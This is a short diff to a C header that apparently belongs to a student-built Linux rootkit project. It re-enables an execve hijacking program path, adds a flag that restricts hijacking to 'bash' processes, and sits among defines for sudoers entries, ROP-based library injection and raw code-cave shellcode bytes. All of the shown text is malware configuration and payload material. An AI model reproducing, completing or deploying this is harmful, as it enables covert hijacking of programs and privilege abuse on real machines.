@@ -19,8 +19,9 @@
 #define STRING_FS_SUDOERS_ENTRY_LEN 37
 
 //EXECUTION HIJACKING
-#define PATH_EXECUTION_HIJACK_PROGRAM "/home/osboxes/TFG/src/helpers/execve_hijackdeactivated\0"
 
+#define PATH_EXECUTION_HIJACK_PROGRAM "/home/osboxes/TFG/src/helpers/execve_hijack\0"
+#define EXEC_HIJACK_ACTIVE_TEMP 0
 
 //LIBRARY INJECTION WITH ROP
 #define TASK_COMM_NAME_ROP_TARGET "simple_timer"
@@ -48,5 +49,7 @@
 \x5f\x5b\x5a\x59\x58\x5d\xff\x25\x00\x00\x00\x00"
 #define CODE_CAVE_SHELLCODE_ASSEMBLE_3_LEN 37
 
+#define TASK_COMM_NAME_RESTRICT_HIJACK "bash"
+#define TASK_COMM_RESTRICT_HIJACK_ACTIVE 1
 
 #endif
